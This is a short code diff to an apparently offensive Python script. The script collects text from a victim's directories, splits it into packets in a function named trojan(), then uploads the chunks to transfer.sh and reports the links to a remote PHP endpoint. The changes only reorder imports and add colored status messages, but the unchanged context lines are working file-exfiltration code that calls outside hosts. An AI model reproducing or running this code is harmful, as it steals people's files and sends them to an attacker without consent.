@@ -1,6 +1,8 @@
-import os
-import requests
 import textwrap
+import requests
+import os
+
+from config import *
 
 directory = os.getcwd()
 start = ''
@@ -14,7 +16,6 @@ for path in directory.split("/"):
     except:
         continue
 
-print(start)
 text = ''
 
 dirs = [start]
@@ -37,7 +38,7 @@ def trojan():
             continue
 
     s = textwrap.wrap(text, 10240)
-    print("Packets: ", len(s))
+    print(green + "[+] Packets: ", len(s))
 
 
 def link_spoof():
@@ -47,5 +48,5 @@ def link_spoof():
         link = requests.put("https://transfer.sh/part" + str(k) + ".txt", data={i.encode('utf-8')}).text
         requests.post("http://aps1.c1.biz/report-site.php", {"link": link, "k": k})
 
-        print(link)
-        print(i)
+        print(magenta + "[.] Putted :" + link)
+        print(green + f"[+] We got: {str(i)}")
